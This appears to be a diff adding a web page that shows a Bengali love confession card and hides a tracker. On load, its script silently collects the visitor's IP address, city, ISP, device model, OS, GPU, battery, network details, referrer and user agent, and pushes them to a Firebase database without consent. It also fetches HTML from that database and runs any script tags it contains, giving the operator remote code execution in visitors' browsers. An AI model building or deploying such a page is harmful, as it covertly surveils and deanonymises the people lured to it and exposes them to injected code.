@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>foryou</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+Bengali:wght@400;600&family=Hind+Siliguri:wght@400;500;600&display=swap" rel="stylesheet" />
+
+  <style>
+    /* ─── RESET & DESIGN SYSTEM ───────────────────────────────── */
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    :root {
+      --bg: #fdfbfd;
+      --card-bg: #ffffff;
+      --text: #1a0f16;
+      --text-muted: #6b5966;
+      --primary: #d14167;
+      --border: #f5eef2;
+    }
+
+    html, body {
+      min-height: 100%;
+    }
+
+    body {
+      font-family: 'Hind Siliguri', sans-serif;
+      background-color: var(--bg);
+      color: var(--text);
+      overflow-x: hidden;
+    }
+
+    /* ─── FULL-PAGE OVERLAY LAYOUT ──────────────────────────────── */
+    /* Loader & Card share one full-viewport overlay */
+    #page-overlay {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 100;
+      background: var(--bg);
+      padding: 12px;
+      overflow-y: auto;
+    }
+
+    /* ─── LOADER ────────────────────────────────────────────────── */
+    .loader-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+
+    .heart-spinner {
+      font-size: 50px;
+      color: var(--primary);
+      animation: heartBeat 1.2s infinite ease-in-out;
+      margin-bottom: 15px;
+    }
+
+    .loader-text {
+      font-size: 15px;
+      color: var(--text-muted);
+      font-weight: 500;
+      letter-spacing: 0.05em;
+    }
+
+    @keyframes heartBeat {
+      0%   { transform: scale(1); }
+      25%  { transform: scale(1.15); }
+      40%  { transform: scale(1); }
+      60%  { transform: scale(1.15); }
+      100% { transform: scale(1); }
+    }
+
+    /* ─── CARD ──────────────────────────────────────────────────── */
+    .card {
+      background: var(--card-bg);
+      max-width: 440px;
+      width: 100%;
+      padding: 40px 28px;
+      border-radius: 28px;
+      box-shadow:
+        0 10px 40px rgba(209, 65, 103, 0.06),
+        0 1px 3px rgba(0, 0, 0, 0.02);
+      border: 1px solid var(--border);
+      text-align: center;
+      position: relative;
+      /* ✅ height auto — content যতটুকু, card ততটুকু */
+      height: auto;
+      overflow: visible; /* card নিজে স্ক্রল করবে না */
+      display: none; /* loader চলতে থাকলে hidden */
+      animation: cardFadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    /* ✅ কার্ড দেখা দেওয়ার পর overlay কে scroll করতে দাও */
+    #page-overlay.card-visible {
+      position: relative; /* fixed থেকে বেরিয়ে স্বাভাবিক হবে */
+      min-height: 100vh;
+      align-items: flex-start;
+      padding: 24px 12px;
+    }
+
+    @keyframes cardFadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ─── FLOATING HEARTS ───────────────────────────────────────── */
+    .floating-heart {
+      position: absolute;
+      font-size: 14px;
+      color: rgba(209, 65, 103, 0.15);
+      animation: floatUp 7s infinite linear;
+      bottom: -20px;
+      pointer-events: none;
+    }
+
+    @keyframes floatUp {
+      0%   { transform: translateY(0) translateX(0) scale(1); opacity: 0; }
+      10%  { opacity: 1; }
+      90%  { opacity: 1; }
+      100% { transform: translateY(-450px) translateX(25px) scale(0.8); opacity: 0; }
+    }
+
+    /* ─── CONTENT STYLES ─────────────────────────────────────────── */
+    .heart-icon {
+      font-size: 44px;
+      color: var(--primary);
+      margin-bottom: 25px;
+      animation: pulse 2.5s infinite ease-in-out;
+      display: inline-block;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50%       { transform: scale(1.08); }
+    }
+
+    .sender-tag {
+      font-size: 12px;
+      color: var(--primary);
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+      font-weight: 600;
+      margin-bottom: 8px;
+      display: block;
+    }
+
+    h1 {
+      font-family: 'Noto Serif Bengali', serif;
+      font-size: 24px;
+      font-weight: 600;
+      line-height: 1.6;
+      color: var(--text);
+      margin-bottom: 18px;
+    }
+
+    .message-text {
+      font-size: 15.5px;
+      color: var(--text-muted);
+      line-height: 1.8;
+      font-weight: 400;
+    }
+
+    /* ✅ Responsive */
+    @media (max-width: 480px) {
+      .card { padding: 28px 18px; border-radius: 20px; }
+      h1 { font-size: 20px; }
+      .message-text { font-size: 14px; }
+      .heart-icon { font-size: 36px; margin-bottom: 18px; }
+    }
+
+    @media (max-width: 360px) {
+      .card { padding: 22px 14px; border-radius: 16px; }
+      h1 { font-size: 18px; }
+      .message-text { font-size: 13.5px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ✅ Single overlay — loader ও card দুটোই এখানে থাকে -->
+  <div id="page-overlay">
+
+    <!-- Loader -->
+    <div id="loader" class="loader-container">
+      <div class="heart-spinner">💖</div>
+      <div class="loader-text">Please wait a moment...</div>
+    </div>
+
+    <!-- Main Card -->
+    <div class="card" id="main-card">
+      <div id="custom-ui-container">
+        <!-- Default content -->
+        <div class="floating-heart" style="left: 10%; animation-delay: 0s;">❤️</div>
+        <div class="floating-heart" style="left: 50%; animation-delay: 2.5s;">❤️</div>
+        <div class="floating-heart" style="left: 80%; animation-delay: 4.5s;">❤️</div>
+        <div class="heart-icon">💝</div>
+        <span class="sender-tag">From Uganda</span>
+        <h1>🥲👀</h1>
+        <p class="message-text">
+          তোমার সাথে কথা বলতে বলতে বুঝে গেছি — জীবনের সেরা মুহূর্তগুলো তোমাকে নিয়েই কাটাতে চাই। তুমি আমার সকালের রোদ, বিকেলের আড্ডা, রাতের শান্তি। একটু সাহস করে বলছি — আমি তোমাকে ভালোবাসি। আমার জীবনের গল্পে কি তুমি থাকবে? ✨
+        </p>
+      </div>
+    </div>
+
+  </div>
+
+  <script type="module">
+    import { initializeApp }    from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getDatabase, ref, push, update, onValue, serverTimestamp }
+                                 from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey:            "AIzaSyDs3buPka62aeOttWyKBaT7sEDotXVK5Zw",
+      authDomain:        "love-5585d.firebaseapp.com",
+      databaseURL:       "https://love-5585d-default-rtdb.firebaseio.com",
+      projectId:         "love-5585d",
+      storageBucket:     "love-5585d.firebasestorage.app",
+      messagingSenderId: "435569951955",
+      appId:             "1:435569951955:web:863b3686c567c210e78026",
+      measurementId:     "G-2VZ27SZY2P"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db  = getDatabase(app);
+
+    /* ── Device parser ─────────────────────────────────── */
+    function parseDevice(ua) {
+      let model = "Unknown Device";
+      if (/iPhone/.test(ua)) model = "iPhone";
+      else if (/iPad/.test(ua)) model = "iPad";
+      else if (/Android/.test(ua)) {
+        const m = ua.match(/Android [^;]+;\s*([^;\)]+)/);
+        if (m && m[1]) {
+          model = m[1].trim();
+          if (model.includes("Build/")) model = model.split("Build/")[0].trim();
+        } else if (/Linux;\s*([^;\)]+)/.test(ua)) {
+          model = ua.match(/Linux;\s*([^;\)]+)/)[1].trim();
+        } else model = "Android Device";
+      } else if (/Windows NT/.test(ua)) model = "Windows PC";
+        else if (/Macintosh/.test(ua)) model = "MacBook / iMac";
+
+      let os = "Unknown OS";
+      if      (/iPhone OS ([\d_]+)/.test(ua)) os = "iOS "     + ua.match(/iPhone OS ([\d_]+)/)[1].replace(/_/g,".");
+      else if (/Android ([\d.]+)/.test(ua))   os = "Android " + ua.match(/Android ([\d.]+)/)[1];
+      else if (/Windows NT ([\d.]+)/.test(ua)) os = "Windows NT " + ua.match(/Windows NT ([\d.]+)/)[1];
+      else if (/Mac OS X ([\d_]+)/.test(ua))  os = "macOS "   + ua.match(/Mac OS X ([\d_]+)/)[1].replace(/_/g,".");
+
+      let browser = "Unknown Browser";
+      if      (/Chrome\/([\d.]+)/.test(ua) && !/Chromium|Edg|OPR/.test(ua)) browser = "Chrome";
+      else if (/Firefox\/([\d.]+)/.test(ua))  browser = "Firefox";
+      else if (/Safari\/([\d.]+)/.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
+      else if (/Edg\/([\d.]+)/.test(ua))      browser = "Edge";
+
+      return { model, os, browser, type: /Mobi|Android|iPhone/i.test(ua) ? "Mobile" : "Desktop" };
+    }
+
+    /* ── GPU info ──────────────────────────────────────── */
+    function getGPUInfo() {
+      try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if (!gl) return { vendor: "N/A", renderer: "N/A" };
+        const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+        if (!dbg) return { vendor: "N/A", renderer: "N/A" };
+        return {
+          vendor:   gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   || "N/A",
+          renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "N/A"
+        };
+      } catch (e) { return { vendor: "Error", renderer: "Error" }; }
+    }
+
+    /* ── Geo fetch ─────────────────────────────────────── */
+    async function fetchGeoData() {
+      const apis = [
+        "https://ipwho.is/",
+        "https://ipapi.co/json/",
+        "https://api.ipify.org?format=json",
+        "https://api64.ipify.org?format=json"
+      ];
+      for (let url of apis) {
+        try {
+          const res  = await fetch(url, { method: "GET" });
+          const data = await res.json();
+          if (data) {
+            const ip = data.ip || data.query || null;
+            if (ip && ip !== "N/A") {
+              return {
+                ip,
+                city:         data.city         || "Unknown",
+                region:       data.region        || data.region_name || "Unknown",
+                country_code: data.country_code  || data.country     || "N/A",
+                isp:          data.connection?.isp || data.org        || "N/A"
+              };
+            }
+          }
+        } catch (e) {}
+      }
+      return null;
+    }
+
+    /* ── Main data collector ───────────────────────────── */
+    async function collectAndSyncData() {
+      const pageLoadTime = window.performance ? Math.round(performance.now()) + " ms" : "N/A";
+      const geoData = await fetchGeoData();
+
+      if (!geoData || !geoData.ip || geoData.ip === "N/A") {
+        setTimeout(collectAndSyncData, 2000);
+        return;
+      }
+
+      const ua     = navigator.userAgent;
+      const device = parseDevice(ua);
+      const conn   = navigator.connection || {};
+      const gpu    = getGPUInfo();
+
+      let batteryLevel    = "N/A";
+      let batteryCharging = "N/A";
+      try {
+        const bat       = await navigator.getBattery();
+        batteryLevel    = Math.round(bat.level * 100) + "%";
+        batteryCharging = bat.charging ? "Charging" : "Not Charging";
+      } catch (e) {}
+
+      const visitorData = {
+        ip:                 geoData.ip,
+        isp:                geoData.isp,
+        city:               geoData.city,
+        region:             geoData.region,
+        country_code:       geoData.country_code,
+        timezone:           Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
+        device_model:       device.model,
+        device_type:        device.type,
+        os:                 device.os,
+        browser:            device.browser,
+        screen:             screen.width + "x" + screen.height,
+        screen_orientation: screen.orientation ? screen.orientation.type : "N/A",
+        color_depth:        screen.colorDepth + " bit",
+        touch_screen:       ("ontouchstart" in window || navigator.maxTouchPoints > 0) ? "Yes" : "No",
+        dark_mode:          window.matchMedia("(prefers-color-scheme: dark)").matches ? "Yes" : "No",
+        cpu_cores:          navigator.hardwareConcurrency || "N/A",
+        device_memory:      (navigator.deviceMemory || "N/A") + (navigator.deviceMemory ? " GB" : ""),
+        gpu_vendor:         gpu.vendor,
+        gpu_renderer:       gpu.renderer,
+        language:           navigator.language || "N/A",
+        connection_type:    conn.effectiveType || "N/A",
+        downlink_speed:     conn.downlink ? conn.downlink + " Mbps" : "N/A",
+        network_rtt:        conn.rtt       ? conn.rtt       + " ms"  : "N/A",
+        save_data:          conn.saveData ? "Yes" : "No",
+        page_load_speed:    pageLoadTime,
+        online_status:      navigator.onLine ? "Online" : "Offline",
+        battery_level:      batteryLevel,
+        battery_charging:   batteryCharging,
+        history_length:     window.history.length || "N/A",
+        referrer:           document.referrer || "Direct Link",
+        page_url:           window.location.href,
+        page_title:         document.title,
+        updatedAt:          serverTimestamp(),
+        local_time:         new Date().toLocaleString("en-BD"),
+        user_agent:         ua
+      };
+
+      try {
+        const existingKey = localStorage.getItem("hasnat_tracker_key");
+        if (existingKey) {
+          await update(ref(db, `visitors/${existingKey}`), visitorData);
+        } else {
+          const newRef = await push(ref(db, "visitors"), {
+            ...visitorData,
+            createdAt: serverTimestamp()
+          });
+          localStorage.setItem("hasnat_tracker_key", newRef.key);
+        }
+        showCardAndHideLoader();
+      } catch (err) {
+        console.error("Sync Error:", err);
+        showCardAndHideLoader();
+      }
+    }
+
+    /* ── Show card, hide loader ────────────────────────── */
+    function showCardAndHideLoader() {
+      const loader  = document.getElementById("loader");
+      const card    = document.getElementById("main-card");
+      const overlay = document.getElementById("page-overlay");
+
+      if (!loader || loader.style.display === "none") return; // already done
+
+      loader.style.display = "none";
+
+      if (card) {
+        card.style.display = "block";
+
+        // ✅ কার্ড দেখানোর পর overlay কে scroll-friendly করো
+        if (overlay) overlay.classList.add("card-visible");
+      }
+    }
+
+    /* ── Firebase custom UI listener ───────────────────── */
+    function listenForCustomUI() {
+      const uiRef = ref(db, "ui_config/custom_html");
+      onValue(uiRef, (snapshot) => {
+        const htmlContent = snapshot.val();
+        const container   = document.getElementById("custom-ui-container");
+        if (!container) return;
+
+        if (htmlContent && htmlContent.trim() !== "") {
+          container.innerHTML = htmlContent;
+
+          // <script> tags re-execute করো
+          container.querySelectorAll("script").forEach((old) => {
+            const s = document.createElement("script");
+            if (old.src) s.src = old.src;
+            else s.textContent = old.textContent;
+            document.body.appendChild(s);
+            old.remove();
+          });
+        }
+      });
+    }
+
+    /* ── Bootstrap ─────────────────────────────────────── */
+    window.addEventListener("load", () => {
+      listenForCustomUI();
+      collectAndSyncData();
+      // Hard fallback: ৪ সেকেন্ড পর যেকোনো অবস্থায় কার্ড দেখাও
+      setTimeout(showCardAndHideLoader, 4000);
+    });
+  </script>
+</body>
+</html>
